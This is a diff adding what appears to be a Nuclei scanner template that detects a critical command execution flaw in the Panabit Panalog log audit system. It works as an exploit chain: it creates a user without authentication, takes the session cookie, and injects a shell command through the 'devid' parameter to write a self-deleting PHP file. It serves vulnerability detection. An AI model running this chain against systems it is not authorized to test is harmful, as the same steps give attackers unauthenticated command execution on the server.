@@ -1,0 +1,79 @@
+id: panabit-panalog-command-exec
+
+info:
+  name: Panabit Panalog Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The Panabit log audit system has a command execution vulnerability that can be exploited to gain server control permissions.
+  classification:
+    cvss-metrics: "3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    cvss-score: 9.0
+  tags: command-exec,rce
+
+variables:
+  cmd: "whoami"
+
+flow: |
+  http(1) && http(2) && http(3) && http(4)
+
+http:
+  - id: add-user
+    method: POST
+    path:
+      - "{{BaseURL}}/singleuser_action.php"
+    headers:
+      Content-Type: application/json
+    body: |
+      {"syncInfo":{"operationType":"ADD_USER","user":{"userId":111}}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{\"yn\":\"yes\",\"str\":\"OK\"}"
+
+  - id: login-user
+    method: GET
+    path:
+      - "{{BaseURL}}/singlelogin.php?userId=111"
+    extractors:
+      - type: regex
+        name: session_cookie
+        internal: true
+        part: header
+        regex:
+          - "Set-Cookie: PHPSESSID=(.*?);"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+
+  - id: create-malicious-file
+    method: GET
+    path:
+      - "{{BaseURL}}/App/appiplist.php?devid=;echo%20%27%3C?php%20echo%20md5(233);unlink(__FILE__);?%3E%27%3E{{session_cookie}}.php;"
+    headers:
+      Cookie: "{{session_cookie}}"
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-malicious-file
+    method: GET
+    path:
+      - "{{BaseURL}}/App/{{session_cookie}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
